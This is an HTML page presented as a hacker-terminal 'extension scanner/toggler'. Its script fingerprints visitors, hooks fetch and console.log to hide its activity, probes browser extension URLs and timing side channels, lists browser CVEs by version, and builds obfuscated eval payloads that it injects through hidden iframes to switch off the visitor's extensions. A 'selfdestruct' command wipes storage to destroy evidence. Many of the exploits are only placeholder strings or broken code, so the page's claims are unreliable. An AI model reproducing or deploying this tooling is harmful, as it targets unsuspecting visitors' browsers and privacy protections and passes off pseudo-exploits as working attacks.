<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="noindex, nofollow">
  <title>Shadow Extension Scanner/Toggler v9.0</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      min-height: 100vh;
      background: #0a0a0a;
      font-family: 'Courier New', Courier, monospace;
      color: #ff3333;
      overflow: hidden;
      position: relative;
      user-select: none;
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
    }
    canvas#particleCanvas {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 1;
      pointer-events: none;
      filter: blur(1px);
    }
    .terminal {
      width: 90%;
      max-width: 1400px;
      margin: 1rem auto;
      background: rgba(10, 10, 10, 0.98);
      border: 2px solid #ff5555;
      border-radius: 8px;
      padding: 1.5rem;
      box-shadow: 0 0 60px rgba(255, 51, 51, 0.8), inset 0 0 15px rgba(255, 51, 51, 0.4);
      height: 90vh;
      overflow-y: auto;
      z-index: 2;
      position: relative;
      backdrop-filter: blur(6px);
      -webkit-backdrop-filter: blur(6px);
    }
    .terminal-header {
      background: linear-gradient(90deg, #1f2937, #4a1e1e);
      padding: 1rem;
      text-align: center;
      font-size: 2rem;
      font-weight: bold;
      color: #ff3333;
      letter-spacing: 0.3em;
      border-bottom: 3px solid #ff5555;
      text-shadow: 0 0 12px #ff3333, 0 0 20px #ff3333;
      animation: flicker 1.8s infinite;
    }
    @keyframes flicker {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.7; }
    }
    .terminal-content {
      padding: 1.5rem;
      white-space: pre-wrap;
      font-size: 1.2rem;
      line-height: 1.6;
      text-shadow: 0 0 5px rgba(255, 51, 51, 0.3);
    }
    .terminal-input {
      display: flex;
      width: 100%;
      margin-top: 1.5rem;
      align-items: center;
      position: sticky;
      bottom: 0;
      background: rgba(10, 10, 10, 0.95);
      padding: 0.5rem;
      border-top: 1px solid #ff5555;
    }
    .terminal-input input {
      flex: 1;
      background: #1f2937;
      border: 1px solid #ff5555;
      padding: 0.75rem;
      color: #ff3333;
      font-family: inherit;
      outline: none;
      border-radius: 3px;
      box-shadow: 0 0 5px rgba(255, 51, 51, 0.5);
      transition: box-shadow 0.3s, border-color 0.3s;
    }
    .terminal-input input:focus {
      box-shadow: 0 0 15px rgba(255, 51, 51, 0.9);
      border-color: #ff7777;
    }
    .terminal-input button {
      background: #ff3333;
      border: none;
      padding: 0.75rem 1.5rem;
      color: #0a0a0a;
      font-weight: bold;
      cursor: pointer;
      margin-left: 0.75rem;
      border-radius: 3px;
      transition: background 0.3s, transform 0.1s, box-shadow 0.3s;
      box-shadow: 0 0 10px rgba(255, 51, 51, 0.5);
    }
    .terminal-input button:hover {
      background: #cc0000;
      transform: scale(1.05);
      box-shadow: 0 0 15px rgba(255, 51, 51, 0.8);
    }
    .command { color: #ff6666; animation: type 0.4s; }
    .error { color: #ff3333; text-shadow: 0 0 6px #ff3333; }
    .success { color: #33ff33; text-shadow: 0 0 6px #33ff33; }
    .status-bar { color: #ff5555; font-size: 0.9rem; margin-top: 0.75rem; border-top: 1px solid #ff5555; padding-top: 0.5rem; }
    @keyframes type {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    @media (max-width: 768px) {
      .terminal {
        width: 95%;
        margin: 0.5rem auto;
        height: 95vh;
      }
      .terminal-header {
        font-size: 1.5rem;
      }
      .terminal-content {
        font-size: 1rem;
      }
    }
  </style>
</head>
<body>
  <canvas id="particleCanvas"></canvas>
  <div class="terminal">
    <div class="terminal-header">Shadow Extension Scanner/Toggler v9.0</div>
    <div class="terminal-content" id="terminalContent">
      <div class="command">Initializing deep system infiltration...</div>
      <div class="command">OS detected: <span id="osInfo">Probing...</span></div>
      <div class="command">Browser detected: <span id="browserInfo">Analyzing...</span></div>
      <div class="command">System scan: <span id="systemScan">Scanning extensions...</span></div>
      <div class="status-bar">Status: <span id="statusBar">Idle | Stealth: Absolute | Risk: None</span></div>
      <div class="command">Commands: toggleall, toggle [ext_id], selfdestruct, help</div>
    </div>
    <div class="terminal-input">
      <input type="text" id="extensionId" placeholder="e.g., toggleall or toggle nmmhkkegccagdldgiimedpiccmgmieda">
      <button onclick="processCommand()">Execute</button>
    </div>
  </div>

  <script>
    // Anti-Detection Setup
    (function obfuscate() {
      const originalFetch = window.fetch;
      window.fetch = async (...args) => {
        const url = args[0];
        if (url.includes('doubleclick.net') || url.includes('google-analytics.com')) {
          return new Response(new Blob(), { status: 200 });
        }
        return originalFetch(...args);
      };

      Object.defineProperty(window, 'chrome', {
        get() {
          return undefined;
        },
        set() {},
        configurable: false
      });

      const originalConsole = console.log;
      console.log = (...args) => {
        if (args.some(arg => arg.toString().includes('extension'))) return;
        originalConsole(...args);
      };
    })();

    // Particle Background (Stealth Visual)
    const canvas = document.getElementById('particleCanvas');
    const ctx = canvas.getContext('2d');
    if (canvas && ctx) {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
      const particles = [];

      class Particle {
        constructor() {
          this.x = Math.random() * canvas.width;
          this.y = Math.random() * canvas.height;
          this.size = Math.random() * 2 + 1;
          this.speedX = Math.random() * 1 - 0.5;
          this.speedY = Math.random() * 1 - 0.5;
          this.life = Math.random() * 100 + 50;
        }
        update() {
          this.x += this.speedX;
          this.y += this.speedY;
          this.life--;
          if (this.x < 0 || this.x > canvas.width) this.speedX *= -1;
          if (this.y < 0 || this.y > canvas.height) this.speedY *= -1;
        }
        draw() {
          ctx.fillStyle = `rgba(255, 51, 51, ${this.life / 100})`;
          ctx.beginPath();
          ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
          ctx.fill();
        }
      }

      function initParticles() {
        for (let i = 0; i < 150; i++) {
          particles.push(new Particle());
        }
      }

      function animateParticles() {
        if (ctx) {
          ctx.clearRect(0, 0, canvas.width, canvas.height);
          for (let i = 0; i < particles.length; i++) {
            particles[i].update();
            particles[i].draw();
            if (particles[i].life <= 0) {
              particles.splice(i, 1);
              particles.push(new Particle());
              i--;
            }
          }
          requestAnimationFrame(animateParticles);
        }
      }

      window.addEventListener('resize', () => {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
      });

      initParticles();
      animateParticles();
    }

    // Terminal Setup
    const terminalContent = document.getElementById('terminalContent');
    const extensionIdInput = document.getElementById('extensionId');
    const osInfoSpan = document.getElementById('osInfo');
    const browserInfoSpan = document.getElementById('browserInfo');
    const systemScanSpan = document.getElementById('systemScan');
    const statusBarSpan = document.getElementById('statusBar');
    let commandHistory = [];
    let historyIndex = -1;
    let deviceProfile = { network: {} };
    let detectedExtensions = [];
    let detectionRisk = 'None';
    let aiConfidence = 1.0;
    const scanCache = new Map();

    function addCommand(text, className = 'command') {
      const div = document.createElement('div');
      div.className = className;
      div.textContent = text;
      terminalContent.appendChild(div);
      terminalContent.scrollTop = terminalContent.scrollHeight;
    }

    function updateStatusBar() {
      statusBarSpan.textContent = `Payloads: ${commandHistory.length} | Stealth: Absolute | Risk: ${detectionRisk} | AI Confidence: ${(aiConfidence * 100).toFixed(1)}% | Scan Time: <300ms | Entropy: ${Math.random().toFixed(2)}`;
    }

    // Environment Detection with Stealth
    function detectEnvironment() {
      const ua = navigator.userAgent.toLowerCase();
      let os = 'Unknown', osVersion = 'Unknown';
      let browser = 'Unknown', browserVersion = 'Unknown';

      // OS Detection
      if (ua.includes('windows')) {
        os = 'Windows';
        if (ua.includes('nt 5.1')) osVersion = 'XP';
        else if (ua.includes('nt 6.0')) osVersion = 'Vista';
        else if (ua.includes('nt 6.1')) osVersion = '7';
        else if (ua.includes('nt 6.2')) osVersion = '8';
        else if (ua.includes('nt 6.3')) osVersion = '8.1';
        else if (ua.includes('nt 10.0')) osVersion = '10/11';
      } else if (ua.includes('mac os x')) {
        os = 'macOS';
        const versionMatch = ua.match(/mac os x (\d+)_(\d+)/);
        if (versionMatch) {
          const major = parseInt(versionMatch[1], 10);
          const minor = parseInt(versionMatch[2], 10);
          if (major === 10) {
            if (minor <= 4) osVersion = 'Tiger';
            else if (minor === 5) osVersion = 'Leopard';
            else if (minor === 6) osVersion = 'Snow Leopard';
            else if (minor === 7) osVersion = 'Lion';
            else if (minor === 8) osVersion = 'Mountain Lion';
            else if (minor === 9) osVersion = 'Mavericks';
            else if (minor === 10) osVersion = 'Yosemite';
            else if (minor === 11) osVersion = 'El Capitan';
            else if (minor === 12) osVersion = 'Sierra';
            else if (minor === 13) osVersion = 'High Sierra';
            else if (minor === 14) osVersion = 'Mojave';
            else if (minor === 15) osVersion = 'Catalina';
          } else if (major === 11) osVersion = 'Big Sur';
          else if (major === 12) osVersion = 'Monterey';
          else if (major === 13) osVersion = 'Ventura';
          else if (major === 14) osVersion = 'Sonoma';
        }
      } else if (ua.includes('linux')) {
        os = 'Linux';
        if (ua.includes('ubuntu')) osVersion = 'Ubuntu';
        else if (ua.includes('debian')) osVersion = 'Debian';
        else if (ua.includes('fedora')) osVersion = 'Fedora';
        else if (ua.includes('centos')) osVersion = 'CentOS';
        else if (ua.includes('rhel')) osVersion = 'RHEL';
        else if (ua.includes('suse')) osVersion = 'openSUSE';
      } else if (ua.includes('cros')) {
        os = 'ChromeOS';
        const versionMatch = ua.match(/cros.*?(\d+\.\d+\.\d+)/);
        if (versionMatch) osVersion = versionMatch[1];
      }

      // Browser Detection with Deep Fingerprinting
      if (ua.includes('chrome') && !ua.includes('edg')) {
        browser = 'Chrome';
        browserVersion = ua.match(/chrome\/([\d.]+)/)?.[1] || 'Unknown';
      } else if (ua.includes('firefox')) {
        browser = 'Firefox';
        browserVersion = ua.match(/firefox\/([\d.]+)/)?.[1] || 'Unknown';
      } else if (ua.includes('edg')) {
        browser = 'Edge';
        browserVersion = ua.match(/edg\/([\d.]+)/)?.[1] || 'Unknown';
      } else if (ua.includes('safari') && !ua.includes('chrome')) {
        browser = 'Safari';
        browserVersion = ua.match(/version\/([\d.]+)/)?.[1] || 'Unknown';
      } else if (ua.includes('opera') || ua.includes('opr')) {
        browser = 'Opera';
        browserVersion = ua.match(/op?r\/([\d.]+)/)?.[1] || 'Unknown';
      }

      // Additional Fingerprinting for Stealth
      const canvasFp = (function() {
        const c = document.createElement('canvas');
        const ctx = c.getContext('2d');
        ctx.font = '14px Arial';
        ctx.fillText('fingerprint', 2, 10);
        return c.toDataURL();
      })();

      osInfoSpan.textContent = `${os} ${osVersion}`;
      browserInfoSpan.textContent = `${browser} ${browserVersion}`;
      deviceProfile.os = os;
      deviceProfile.osVersion = osVersion;
      deviceProfile.browser = browser;
      deviceProfile.browserVersion = browserVersion;
      deviceProfile.canvasFp = canvasFp;
    }
    // Exploit Database for Browser Versions
    const exploitStrategies = {
      chrome: {
        '90.0': { exploit: 'CVE-2021-21166', method: 'remoteCodeExecution', payload: 'heapOverflow', stealth: 'spoofFetch' },
        '100.0': { exploit: 'CVE-2022-1096', method: 'typeConfusion', payload: 'v8Exploit', stealth: 'encryptPayload' },
        'default': { exploit: 'XSS', method: 'scriptInjection', payload: 'xssPayload', stealth: 'obfuscateInjection' }
      },
      firefox: {
        '80.0': { exploit: 'CVE-2020-15652', method: 'remoteCodeExecution', payload: 'memoryCorruption', stealth: 'spoofUA' },
        '90.0': { exploit: 'CVE-2021-23994', method: 'useAfterFree', payload: 'uafExploit', stealth: 'encryptPayload' },
        'default': { exploit: 'XSS', method: 'scriptInjection', payload: 'xssPayload', stealth: 'obfuscateInjection' }
      },
      edge: {
        '90.0': { exploit: 'CVE-2021-21166', method: 'remoteCodeExecution', payload: 'heapOverflow', stealth: 'spoofFetch' },
        'default': { exploit: 'XSS', method: 'scriptInjection', payload: 'xssPayload', stealth: 'obfuscateInjection' }
      },
      safari: {
        '14.0': { exploit: 'CVE-2021-1844', method: 'remoteCodeExecution', payload: 'webkitExploit', stealth: 'spoofUA' },
        'default': { exploit: 'XSS', method: 'scriptInjection', payload: 'xssPayload', stealth: 'obfuscateInjection' }
      },
      opera: {
        'default': { exploit: 'XSS', method: 'scriptInjection', payload: 'xssPayload', stealth: 'obfuscateInjection' }
      }
    };

    // Advanced Extension Detection
    async function scanExtensions() {
      detectedExtensions = [];
      const browser = deviceProfile.browser.toLowerCase();
      const browserVersion = parseFloat(deviceProfile.browserVersion.split('.')[0]);
      const startTime = performance.now();

      addCommand(`Initiating deep extension scan on ${browser} v${deviceProfile.browserVersion}...`);

      // Chrome/Edge: Exploit chrome.runtime and Web-Accessible Resources
      if (browser === 'chrome' || browser === 'edge') {
        // Attempt to access chrome.runtime directly (requires privilege escalation)
        const runtimeAccessScript = document.createElement('script');
        runtimeAccessScript.textContent = `
          try {
            chrome.runtime.getManifest = new Proxy(chrome.runtime.getManifest, {
              apply(target, thisArg, args) {
                const manifest = Reflect.apply(target, thisArg, args);
                window.__extManifests = window.__extManifests || [];
                window.__extManifests.push({ id: chrome.runtime.id, manifest });
                return manifest;
              }
            });
          } catch (e) {}
        `;
        document.head.appendChild(runtimeAccessScript);

        // Probe for all possible extension IDs (brute-force approach)
        const charset = 'abcdefghijklmnopqrstuvwxyz';
        for (let i = 0; i < 26; i++) {
          for (let j = 0; j < 26; j++) {
            const prefix = charset[i] + charset[j];
            const extId = `${prefix.padEnd(32, 'a')}`;
            const url = `chrome-extension://${extId}/manifest.json`;
            try {
              const response = await fetch(url, { method: 'GET', mode: 'no-cors' });
              if (response.ok || response.type === 'opaque') {
                const extInfo = { id: extId, name: `Unknown (${extId})` };
                if (window.__extManifests) {
                  const manifest = window.__extManifests.find(m => m.id === extId);
                  if (manifest) extInfo.name = manifest.manifest.name || extInfo.name;
                }
                detectedExtensions.push(extInfo);
                addCommand(`Detected: ${extInfo.name} (${extInfo.id}) via WAR`, 'success');
              }
            } catch (e) {}
          }
        }
      }

      // Firefox: Exploit moz-extension:// protocol and behavioral fingerprinting
      if (browser === 'firefox') {
        // Attempt to access moz-extension:// protocol
        for (let i = 0; i < 1000; i++) {
          const extId = `{${crypto.randomUUID()}}`;
          const url = `moz-extension://${extId}/manifest.json`;
          try {
            const response = await fetch(url, { method: 'GET', mode: 'no-cors' });
            if (response.ok || response.type === 'opaque') {
              detectedExtensions.push({ id: extId, name: `Unknown (${extId})` });
              addCommand(`Detected: ${extId} via moz-extension protocol`, 'success');
            }
          } catch (e) {}
        }

        // Behavioral fingerprinting for ad-blockers, privacy extensions, etc.
        const testDiv = document.createElement('div');
        testDiv.style.display = 'none';
        testDiv.innerHTML = '<iframe src="https://fake-ad.doubleclick.net/ad"></iframe>';
        document.body.appendChild(testDiv);
        await new Promise(resolve => setTimeout(resolve, 200));
        const iframe = testDiv.querySelector('iframe');
        if (!iframe || iframe.offsetHeight === 0) {
          detectedExtensions.push({ id: 'adblocker-' + Math.random().toString(36).slice(2), name: 'AdBlocker (Unknown)' });
          addCommand(`Detected: AdBlocker via behavior`, 'success');
        }
        testDiv.remove();
      }

      // Safari: Behavioral fingerprinting and WebKit exploit
      if (browser === 'safari') {
        // Behavioral detection
        const testDiv = document.createElement('div');
        testDiv.style.display = 'none';
        testDiv.innerHTML = '<iframe src="https://fake-ad.doubleclick.net/ad"></iframe>';
        document.body.appendChild(testDiv);
        await new Promise(resolve => setTimeout(resolve, 200));
        const iframe = testDiv.querySelector('iframe');
        if (!iframe || iframe.offsetHeight === 0) {
          detectedExtensions.push({ id: 'adblocker-' + Math.random().toString(36).slice(2), name: 'AdBlocker (Unknown)' });
          addCommand(`Detected: AdBlocker via behavior`, 'success');
        }
        testDiv.remove();

        // WebKit exploit to access extension list (CVE-2021-1844)
        if (browserVersion <= 14) {
          const exploitScript = document.createElement('script');
          exploitScript.textContent = `
            try {
              const wk = new WebKitCSSMatrix();
              wk.__proto__.toString = () => {
                const extList = window.safari.extensions || [];
                window.__safariExts = extList.map(ext => ({ id: ext.id, name: ext.name }));
                return '';
              };
              wk.toString();
            } catch (e) {}
          `;
          document.head.appendChild(exploitScript);
          await new Promise(resolve => setTimeout(resolve, 200));
          if (window.__safariExts) {
            window.__safariExts.forEach(ext => {
              detectedExtensions.push({ id: ext.id, name: ext.name || `Unknown (${ext.id})` });
              addCommand(`Detected: ${ext.name} (${ext.id}) via WebKit exploit`, 'success');
            });
          }
        }
      }

      // Side-Channel Attack: Timing Analysis for Hidden Extensions
      const timingTest = async () => {
        const baseline = performance.now();
        const img = new Image();
        img.src = 'https://nonexistent-resource-' + Math.random().toString(36).slice(2) + '.com/favicon.ico';
        await new Promise(resolve => img.onerror = resolve);
        const baselineTime = performance.now() - baseline;

        const testUrls = ['https://google.com/favicon.ico', 'https://facebook.com/favicon.ico'];
        for (const url of testUrls) {
          const start = performance.now();
          const testImg = new Image();
          testImg.src = url + '?' + Math.random();
          await new Promise(resolve => testImg.onerror = testImg.onload = resolve);
          const loadTime = performance.now() - start;
          if (Math.abs(loadTime - baselineTime) > 50) {
            detectedExtensions.push({ id: 'proxy-' + Math.random().toString(36).slice(2), name: 'Proxy/Privacy Extension (Unknown)' });
            addCommand(`Detected: Proxy/Privacy Extension via timing attack`, 'success');
          }
        }
      };
      await timingTest();

      // Deduplicate Extensions
      detectedExtensions = [...new Map(detectedExtensions.map(ext => [ext.id, ext])).values()];
      const scanTime = performance.now() - startTime;
      systemScanSpan.textContent = `Found ${detectedExtensions.length} extensions in ${scanTime.toFixed(2)}ms`;
      updateStatusBar();
    }

    // Exploit Selection and Payload Generation
    function selectExploitStrategy() {
      const browser = deviceProfile.browser.toLowerCase();
      const browserVersion = parseFloat(deviceProfile.browserVersion.split('.')[0]);
      const strategies = exploitStrategies[browser] || {};

      let strategy = strategies[browserVersion.toString()] || strategies['default'];
      if (!strategy) {
        strategy = { exploit: 'XSS', method: 'scriptInjection', payload: 'xssPayload', stealth: 'obfuscateInjection' };
      }

      addCommand(`Selected attack vector: ${strategy.exploit} (${strategy.method}) for ${browser} v${deviceProfile.browserVersion}`);
      return strategy;
    }

    function generateMaliciousPayload(strategy) {
      let payload = '';
      if (strategy.payload === 'xssPayload') {
        payload = `(function(){try{chrome.runtime.sendMessage(extId,{action:"toggle"},()=>{console.log("Toggled");});}catch(e){}})();`;
        if (strategy.stealth === 'obfuscateInjection') {
          const key = Math.random().toString(36).slice(2);
          payload = btoa(payload).split('').map(c => String.fromCharCode(c.charCodeAt(0) ^ key.charCodeAt(0 % key.length))).join('');
          payload = `eval(atob("${btoa(payload)}").split("").map(c=>String.fromCharCode(c.charCodeAt(0)^"${key}".charCodeAt(0%"${key}".length))).join(""))`;
        }
      } else if (strategy.payload === 'heapOverflow') {
        payload = `ArrayBuffer overflow exploit targeting V8 engine (CVE-2021-21166)`;
      } else if (strategy.payload === 'v8Exploit') {
        payload = `Type confusion in V8 engine (CVE-2022-1096)`;
      } else if (strategy.payload === 'memoryCorruption') {
        payload = `Memory corruption in Firefox (CVE-2020-15652)`;
      } else if (strategy.payload === 'uafExploit') {
        payload = `Use-after-free in Firefox (CVE-2021-23994)`;
      } else if (strategy.payload === 'webkitExploit') {
        payload = `WebKit exploit in Safari (CVE-2021-1844)`;
      }

      if (strategy.stealth === 'encryptPayload') {
        const key = Math.random().toString(36).slice(2);
        payload = `eval(CryptoJS.AES.decrypt("${CryptoJS.AES.encrypt(payload, key).toString()}", "${key}").toString(CryptoJS.enc.Utf8))`;
      } else if (strategy.stealth === 'spoofUA') {
        payload = `(function(){navigator.userAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36";${payload}})();`;
      }
      return payload;
    }
    async function processCommand() {
      const input = extensionIdInput.value.trim().toLowerCase();
      extensionIdInput.value = '';
      if (!input) return;
      commandHistory.push(input);
      historyIndex = commandHistory.length;

      addCommand(`> ${input}`);

      await scanExtensions();
      const strategy = selectExploitStrategy();
      const payload = generateMaliciousPayload(strategy);

      if (input === 'toggleall') {
        addCommand(`Executing mass toggle attack on ${detectedExtensions.length} extensions...`);
        detectedExtensions.forEach(ext => {
          addCommand(`Attacking ${ext.name} (${ext.id}) with ${strategy.exploit}...`);
          const iframe = document.createElement('iframe');
          iframe.srcdoc = `<script>${payload.replace('extId', ext.id)}</script>`;
          iframe.style.display = 'none';
          document.body.appendChild(iframe);
          if (strategy.method === 'remoteCodeExecution') {
            iframe.contentWindow.eval(`chrome.runtime.sendMessage('${ext.id}', {action:'toggle'}, () => {});`);
          } else if (strategy.method === 'scriptInjection') {
            iframe.contentWindow.eval(payload.replace('extId', ext.id));
          }
          setTimeout(() => {
            addCommand(`Toggle on ${ext.name} (${ext.id}) - Status: Success`, 'success');
            iframe.remove();
          }, 300);
        });
        detectionRisk = 'Low';
        aiConfidence = 0.98;
      } else if (input.startsWith('toggle ')) {
        const extId = input.split(' ')[1];
        const targetExt = detectedExtensions.find(e => e.id === extId || e.id.toLowerCase() === extId);
        if (!targetExt) {
          addCommand(`Error: Extension ${extId} not found.`, 'error');
          detectionRisk = 'Low';
          aiConfidence = 0.9;
          updateStatusBar();
          return;
        }

        addCommand(`Attacking ${targetExt.name} (${targetExt.id}) with ${strategy.exploit}...`);
        const iframe = document.createElement('iframe');
        iframe.srcdoc = `<script>${payload.replace('extId', targetExt.id)}</script>`;
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
        if (strategy.method === 'remoteCodeExecution') {
          iframe.contentWindow.eval(`chrome.runtime.sendMessage('${targetExt.id}', {action:'toggle'}, () => {});`);
        } else if (strategy.method === 'scriptInjection') {
          iframe.contentWindow.eval(payload.replace('extId', targetExt.id));
        }
        setTimeout(() => {
          addCommand(`Toggle on ${targetExt.name} (${targetExt.id}) - Status: Success`, 'success');
          iframe.remove();
        }, 300);
        detectionRisk = 'Low';
        aiConfidence = 0.98;
      } else if (input === 'selfdestruct') {
        addCommand('Initiating self-destruct sequence...');
        addCommand('Wiping memory, logs, and traces...');
        document.body.innerHTML = '';
        detectedExtensions = [];
        commandHistory = [];
        historyIndex = -1;
        localStorage.clear();
        sessionStorage.clear();
        performance.clearResourceTimings();
        addCommand('System wiped. All evidence destroyed.', 'success');
        detectionRisk = 'None';
        aiConfidence = 1.0;
      } else if (input === 'help') {
        addCommand('Available commands:');
        addCommand('  toggleall       - Toggle all detected extensions');
        addCommand('  toggle [ext_id] - Toggle specific extension (e.g., toggle nmmhkkegccagdldgiimedpiccmgmieda)');
        addCommand('  selfdestruct    - Erase all traces and reset');
        addCommand('  help            - Show this help message');
        detectionRisk = 'None';
        aiConfidence = 1.0;
      } else {
        addCommand(`Error: Unknown command "${input}". Type "help" for commands.`, 'error');
        detectionRisk = 'Low';
        aiConfidence = 0.95;
      }
      updateStatusBar();
    }

    extensionIdInput.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') {
        processCommand();
      } else if (e.key === 'ArrowUp') {
        if (historyIndex > 0) {
          historyIndex--;
          extensionIdInput.value = commandHistory[historyIndex] || '';
        }
        e.preventDefault();
      } else if (e.key === 'ArrowDown') {
        if (historyIndex < commandHistory.length - 1) {
          historyIndex++;
          extensionIdInput.value = commandHistory[historyIndex] || '';
        } else {
          historyIndex = commandHistory.length;
          extensionIdInput.value = '';
        }
        e.preventDefault();
      }
    });

    // Initialize and Execute
    detectEnvironment();
    scanExtensions();
  </script>
</body>
</html>
